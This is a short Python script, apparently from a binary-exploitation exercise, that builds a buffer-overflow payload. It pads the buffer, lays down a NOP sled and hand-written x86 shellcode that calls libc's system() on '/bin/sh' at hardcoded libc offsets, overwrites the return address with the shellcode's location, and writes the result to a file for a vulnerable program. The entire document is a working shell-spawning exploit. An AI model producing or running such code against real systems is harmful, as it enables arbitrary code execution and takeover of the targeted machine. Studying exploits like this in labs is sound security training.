import struct

libc_base_adr = 0xb7e2c000
system_offset = 0x0003f060
bin_sh_offset = 0x160c58
shellcode_address = 0xbfffe970

# Create the payload
payload = b"a" * 20
payload += b"\x0a"
payload += b"\x90" * (0x800 - 21)
payload += b"\xc7\x04\x24"  # mov_dword
payload += struct.pack("<I", libc_base_adr + bin_sh_offset)
payload += b"\xb8"  # push address on eax
payload += struct.pack("<I", libc_base_adr + system_offset)  # current address for relative call
payload += b"\xff\xd0"  # call eax
payload += b"\x00" * (0x800 - 14)
payload += b"a" * 14
payload += struct.pack("<I", shellcode_address)
payload += b"a"
payload += b"\x0a\x00"

# Save the payload to a file or pass it directly to the vulnerable program
with open('payload', 'wb') as f:
    f.write(payload)
